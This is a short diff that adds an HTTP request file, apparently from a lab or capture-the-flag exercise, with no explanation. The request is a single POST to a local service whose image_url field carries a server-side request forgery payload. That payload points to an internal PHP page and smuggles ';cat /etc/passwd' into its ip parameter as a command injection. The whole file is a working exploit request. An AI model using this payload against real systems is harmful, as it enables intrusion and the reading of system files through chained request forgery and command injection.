@@ -1,0 +1,4 @@
+POST http://localhost:8094
+Content-Type: application/x-www-form-urlencoded
+
+image_url=http%3a//127.0.0.1/secret_feature.php%3fip%3d;cat%2b/etc/passwd
